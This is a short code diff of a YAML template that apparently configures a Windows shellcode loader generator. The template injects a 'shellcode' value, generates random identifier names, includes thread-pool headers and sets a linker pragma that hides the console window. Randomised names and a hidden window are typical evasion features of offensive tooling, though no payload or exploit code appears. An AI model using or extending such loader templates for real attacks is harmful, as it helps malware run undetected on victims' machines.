@@ -6,7 +6,7 @@ build: ~
 process: exe
 set:
   #下面两个都要从写
-  shellcode: kwargs.get('shellcode')  #执行xor运行
+  shellcode: kwargs.get('shellcode')
   r1: randoms().EnglishAlphabet(17)   #随机字符
   r2: randoms().EnglishAlphabet(12)   #随机字符
   r3: randoms().EnglishAlphabet(13)   #随机字符
@@ -14,7 +14,7 @@ set:
 include:
   - '#include <windows.h>'
   - '#include <threadpoolapiset.h>'
-pragma:
+state:
   - '#pragma comment(linker,"/subsystem:\"Windows\" /entry:\"mainCRTStartup\"")'
 define: ~
 class: ~
